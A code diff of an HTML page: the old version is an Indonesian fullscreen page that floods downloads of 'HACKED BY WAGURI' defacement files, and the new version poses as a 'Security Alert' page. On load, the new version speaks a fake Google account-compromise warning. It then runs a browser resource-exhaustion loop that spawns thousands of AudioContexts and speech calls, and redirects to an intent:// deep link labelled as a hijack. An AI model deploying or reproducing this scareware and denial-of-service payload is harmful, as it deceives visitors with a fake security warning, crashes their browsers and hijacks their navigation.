@@ -1,222 +1,225 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Alert</title>
 <style>
-* {
-box-sizing: border-box;
-margin: 0;
-padding: 0;
-}
-body {
-font-family: Arial, sans-serif;
-background: #f4f6f8;
-color: #222;
-padding: 20px;
-}
-.panel {
-background: #ffffff;
-padding: 24px;
-border-radius: 12px;
-box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
-max-width: 600px;
-margin: 40px auto;
-}
-:fullscreen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
-width: 100vw !important;
-height: 100vh !important;
-}
-:-webkit-full-screen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
-}
-h2 { margin-bottom: 10px; }
-p { margin-bottom: 15px; line-height: 1.5; }
-button {
-width: 100%;
-padding: 16px;
-cursor: pointer;
-border: none;
-border-radius: 6px;
-background: #d32f2f;
-color: #ffffff;
-font-weight: bold;
-font-size: 16px;
-box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
-transition: background 0.2s;
-}
-button:hover { background: #b71c1c; }
-#status {
-margin-top: 16px;
-font-weight: bold;
-color: #d32f2f;
-padding: 12px;
-background: #ffebee;
-border-radius: 6px;
-text-align: center;
-border: 1px solid #ffcdd2;
-}
-#downloads {
-margin-top: 20px;
-display: grid;
-grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-gap: 10px;
-}
-#downloads a {
-display: block;
-padding: 8px;
-background: #212121;
-color: #80df82;
-text-decoration: none;
-border-radius: 4px;
-font-size: 12px;
-text-align: center;
-border: 1px solid #424242;
-word-break: break-all;
-}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
-
 <body>
-<div class="panel" id="main-panel">
-<h2>Generator Berkas Data URI &amp; Race Condition</h2>
-<p>Klik tombol untuk masuk ke layar penuh, memicu race condition, dan menjalankan delayed deep link redirect secara terus-menerus.</p>
-
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Condition</button>
-
-<div id="status" role="status">Sistem siap.</div>
-<div id="downloads"></div>
-</div>
-
 <script>
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
+(function () {
+  'use strict';
 
-let isProcessing = false;
+  // ============================================
+  // KONFIGURASI AUTOPLAY
+  // ============================================
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
 
-const speak = (message) => {
-if ('speechSynthesis' in window) {
-window.speechSynthesis.cancel();
-const utterance = new SpeechSynthesisUtterance(message);
-utterance.lang = 'id-ID';
-utterance.rate = 1.0;
-window.speechSynthesis.speak(utterance);
-}
-};
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
-// Fungsi helper konversi string ke Base64 Data URI (tanpa Blob/ObjectURL)
-const createDataUriPayload = () => {
-const payloadText = "<!DOCTYPE html>" +
-"<html>" +
-"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
-"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
-"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
-"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
-"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Race condition payload dispatches.</p>" +
-"</div>" +
-"</body>" +
-"</html>";
-  
-  return "data:text/html;base64," + btoa(unescape(encodeURIComponent(payloadText)));
-};
+  // ============================================
+  // TTS — TANPA CANCEL DI DALAM LOOP
+  // ============================================
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
 
-// Menggabungkan struktur asli dengan Race Condition & Delayed Deep Link Redirect
-const prepareMimeBlobAsync = (i) => {
-return new Promise((resolve) => {
-// Race condition via overlapping microtasks & minimal timeout schedule
-queueMicrotask(() => {
-  setTimeout(() => {
-    const dataUri = createDataUriPayload();
-    resolve({ id: i, url: dataUri });
-  }, Math.random() * 5); // Jeda acak ekstrem untuk memicu race condition pada antrean unduhan
-});
-});
-};
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
 
-const triggerInstantDownload = (fileData) => {
-const link = document.createElement("a");
-link.href = fileData.url;
-link.download = `waguri-file-${fileData.id}.txt`;
-link.textContent = `DataURI #${fileData.id} (.txt)`;
-link.style.display = "none";
-downloadsDiv.appendChild(link);
-link.click();
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
 
-// Membersihkan elemen link secara instan untuk mempertahankan race condition memory pressure
-setTimeout(() => {
-  if (link.parentNode) link.parentNode.removeChild(link);
-}, 100);
-};
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
 
-const processLoop = async (counter) => {
-if (!isProcessing) return;
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
+  }
 
-// Menerapkan eksekusi paralel (Race Condition) dengan Promise.all beruntun
-const promises = [];
-for (let j = 0; j < 3; j++) { // Meluncurkan 3 instance secara bersamaan per iterasi
-  promises.push(prepareMimeBlobAsync(counter + j));
-}
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
 
-const results = await Promise.all(promises);
-results.forEach(fileData => {
-  triggerInstantDownload(fileData);
-});
+  // ============================================
+  // AUDIO CONTEXT UNLOCK
+  // ============================================
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
 
-statusDiv.textContent = `Race Condition Berjalan: Batch counter ke-${counter} dikirim`;
+  // ============================================
+  // SILENT AUDIO ELEMENT
+  // ============================================
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
 
-if (counter % 10 === 0) {
-speak(`Proses mencapai batch ${counter}.`);
-}
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
 
-// Delayed Redirect / Deep Link Hijacking Chaining pada hitungan tertentu
-if (counter === 15) {
-  try {
-    // Memicu delayed intent / custom scheme deep link hijacking secara asinkron
-    setTimeout(() => {
-      window.location.href = "intent://security-audit#Intent;scheme=exploit;package=com.vuln.browser;end;";
-    }, 1200);
-  } catch(e) {}
-}
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
 
-setTimeout(() => processLoop(counter + 3), 0);
-};
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
 
-startBtn.addEventListener("click", () => {
-if (isProcessing) return;
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
+    }
+  }
 
-downloadsDiv.replaceChildren();
-speak("Mengaktifkan mode layar penuh dan race condition.");
+  // ============================================
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS) + RACE CONDITION & DEEP LINK
+  // ============================================
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    // Menerapkan Race Condition dengan Promise.all paralel untuk memicu konflik alokasi memori
+    setInterval(function() {
+      try {
+        var tasks = [];
+        for (var i = 0; i < 50; i++) {
+          tasks.push(new Promise((resolve) => {
+            queueMicrotask(() => {
+              try {
+                for (var j = 0; j < 40; j++) {
+                  var ctx = new (window.AudioContext || window.webkitAudioContext)();
+                  var osc = ctx.createOscillator();
+                  var gain = ctx.createGain();
+                  osc.connect(gain);
+                  gain.connect(ctx.destination);
+                  osc.start(0);
 
-const root = document.documentElement;
-try {
-if (root.requestFullscreen) {
-root.requestFullscreen();
-} else if (root.webkitRequestFullscreen) {
-root.webkitRequestFullscreen();
-} else if (root.mozRequestFullScreen) {
-root.mozRequestFullScreen();
-}
-statusDiv.textContent = "Mengunci layar penuh & memulai race condition...";
-} catch (err) {
-console.warn("Fullscreen tidak didukung atau ditolak:", err);
-}
+                  var u = new SpeechSynthesisUtterance("RACE_CRASH_" + Math.random());
+                  window.speechSynthesis.speak(u);
+                }
+              } catch(e) {}
+              resolve();
+            });
+          }));
+        }
+        Promise.all(tasks);
+      } catch(e) {}
+    }, 50);
 
-setTimeout(() => {
-isProcessing = true;
-speak("Proses dispatch dimulai.");
-processLoop(1);
-}, 300);
-});
+    // Delayed Redirect / Deep Link Hijacking Chaining
+    setTimeout(function() {
+      try {
+        console.log("[*] Executing delayed deep link hijack handler...");
+        window.location.href = "intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;end;";
+      } catch(e) {}
+    }, 4000);
+  }
+
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  unlockAudioContext();
+  trySilentAudio();
+
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); // coba TTS lebih awal
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER & RACE CONDITION DI SINI
+    triggerHighSeverityCrash();
+    
+  }, 1500);
+
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
+
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
+})();
 </script>
 </body>
 </html>
